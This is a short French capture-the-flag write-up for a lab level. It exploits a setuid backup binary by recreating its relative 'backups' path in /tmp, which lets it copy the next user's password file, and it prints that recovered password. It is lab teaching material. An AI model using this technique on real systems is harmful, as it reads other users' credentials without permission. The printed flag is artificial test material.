# Level 08

A la racine du level08, on découvre le binaire level08 et un dossier backups qui contient un .log.

Après la traduction du binaire, on s'aperçoit que celui-ci prend un argument qui sera utilisé comme fichier à copier dans le dossier backups présent dans le répertoire courant.

```shell
> ./level08 level08 
> ls backups/
level08
```

On cherche donc à copier le .pass du level09 dans backups.

```shell
> ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Comme montré ci dessus, ainsi que dans le fichier source, le programme cherche le fichier .pass dans l'arborescence précisé depuis backups. Cependant, on ne peut créer cette arborescence dans le fichier existant faute de permissions, on va donc essayer de recréer cet environement dans /tmp.

```shell
> cd /tmp
> mkdir -p backups/home/users/level09
> ~/./level08 /home/users/level09/.pass
> cat backups//home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

